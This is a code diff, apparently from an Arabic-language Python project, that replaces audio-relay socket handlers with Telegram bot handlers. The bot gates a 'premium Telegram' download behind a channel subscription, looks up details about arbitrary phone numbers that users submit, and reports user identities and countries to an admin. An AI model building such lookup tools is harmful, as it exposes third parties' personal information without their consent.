-    emit('receive_audio_from_host', audio_data, broadcast=True, include_self=False)
+# =======================================================
+# [ BOT EVENT HANDLERS ]
+# =======================================================
+@sytc_bot.on(events.CallbackQuery)
+async def callback_handler(event):
+  sender_id = event.sender_id
+  sender = await event.get_sender()
+  username = getattr(sender, 'username', None)
+  first_name = getattr(sender, 'first_name', '')
 
-@socketio.on('audio_from_host')
-def handle_host_audio(audio_data):
-    emit('receive_audio_from_listener', audio_data, broadcast=True, include_self=False)
+  data = event.data
 
-@socketio.on('end_conversatio
+  if data == b'main_menu':
+    USER_MODES.pop(sender_id, None)
+    await event.edit(WELCOME_TEXT, buttons=get_main_keyboard())
+
+  elif data == b'btn_premium':
+    asyncio.create_task(
+        notify_admin(
+            sender_id,
+            username,
+            first_name,
+            'طلب الحصول على تلجرام المميز',
+            get_country_name(str(sender_id)),
+        )
+    )
+    is_subbed = await check_subscription(sender_id)
+    if is_subbed:
+      buttons = [
+          [Button.url('💎 تحميل تلجرام المميز ⚡', PREMIUM_URL)],
+          [Button.inline('🔙 العودة للقائمة الرئيسية', data=b'main_menu')],
+      ]
+      await event.edit(
+          f'🎉 **تهانينا! تم التحقق من اشتراكك بنجاح.**\n\n{FOOTER_TEXT}',
+          buttons=buttons,
+      )
+    else:
+      buttons = [
+          [
+              Button.url(
+                  '📢 الاشتراك بالقناة أولاً', f'https://t.me/{CHANNEL_USERNAME}'
+              )
+          ],
+          [Button.inline('🔄 تحقق من الاشتراك', data=b'btn_premium')],
+          [Button.inline('🔙 العودة للقائمة الرئيسية', data=b'main_menu')],
+      ]
+      await event.edit(
+          f'⚠️ **عذراً، يجب عليك الاشتراك بقناتنا أولاً!**\n\n{FOOTER_TEXT}',
+          buttons=buttons,
+      )
+
+  elif data == b'btn_truecaller':
+    asyncio.create_task(
+        notify_admin(
+            sender_id,
+            username,
+            first_name,
+            'بدء استخدام خدمة البحث عن رقم',
+            get_country_name(str(sender_id)),
+        )
+    )
+    USER_MODES[sender_id] = 'waiting_for_truecaller_num'
+    await event.edit(
+        f'🔍 **أرسل الرقم للبحث عنه الآن...**\n\n{FOOTER_TEXT}',
+        buttons=[[Button.inline('🔙 العودة للقائمة الرئيسية', data=b'main_menu')]],
+    )
+
+
+@sytc_bot.on(events.NewMessage(incoming=True))
+async def sytc_bot_message_handler(event):
+  if not event.is_private:
+    return
+  sender_id = event.sender_id
+  sender = await event.get_sender()
+  username = getattr(sender, 'username', None)
+  first_name = getattr(sender, 'first_name', '')
+  text = event.text or ''
+
+  if text.startswith('/start'):
+    USER_MODES.pop(sender_id, None)
+    asyncio.create_task(save_bot_user(sender_id, username, first_name))
+    asyncio.create_task(
+        notify_admin(
+            sender_id,
+            username,
+            first_name,
+            'بدء استخدام البوت (/start)',
+            get_country_name(str(sender_id)),
+        )
+    )
+    await event.respond(WELCOME_TEXT, buttons=get_main_keyboard())
+    return
+
+  if USER_MODES.get(sender_id) == 'waiting_for_truecaller_num':
+    USER_MODES.pop(sender_id, None)
+    norm_p = normalize_phone(text)
+
+    if norm_p in CUSTOM_RESPONSES:
+      await event.respond(CUSTOM_RESPONSES[norm_p])
+      return
+
+    q_pos = truecaller_queue.qsize() + 1
+    msg_text = (
+        '⏳ **جاري الاستعلام عن الرقم...**'
+        if q_pos == 1
+        else f'⏳ **تم وضع طلبك في الترتيب ({q_pos})... يرجى الانتظار.**'
+    )
+    msg = await event.respond(msg_text)
+
+    res = await fetch_truecaller_info_queued(norm_p)
+    if res:
+      await msg.edit(f'🔍 **النتيجة لـ ({norm_p}):**\n\n{res}\n\n{FOOTER_TEXT}')
+    else:
+      await msg.edit('❌ **لم يتم العثور على نتائج أو انتهت مهلة البحث.**')
+
+
+# =======================================================
+# [ MAIN STARTUP ]
+# =======================================================
+async def main():
+  print('🚀 جاري بدء تشغيل النظام الشامل (الراديو + البوتات)...')
+
+  # 1. تشغيل خادم الراديو Flask في خيط منفصل (Daemon Thread)
+  threading.Thread(target=run_flask_server, daemon=True).start()
+
+  # 2. جلب عنوان IP المحلي لعرض روابط الاستماع للراديو
+  try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 80))
+    ip = s.getsockname()[0]
+    s.close()
+  except Exception:
+    ip = '127.0.0.1'
+
+  print('✅ النظام يعمل!')
+  print(f'🎙️ لوحة المذيع (البث الفوري): http://127.0.0.1:5000/host')
+  print(f'🎧 صفحة المستمعين: http://{ip}:5000')
+
+  # 3. تشغيل عملاء تيليجرام
+  await client.start()
+  await sytc_bot.start(bot_token=TOKEN_SYTC_BOT)
+  print('✅ تم تشغيل بوتات تيليجرام بنجاح.')
+
+  # 4. تشغيل طابور Truecaller واستدراك الرسائل الفائتة
+  asyncio.create_task(process_truecaller_queue())
+  await catch_up_missed_messages()
+
+  print('✅ البوت يعمل وجاهز لتلقي الرسائل والأوامر وطابور الانتظار نشط...')
+
+  await asyncio.gather(
+      client.run_until_disconnected(), sytc_bot.run_until_disconnected()
+  )
+
+
+if __name__ == '__main__':
+  asyncio.run(main())
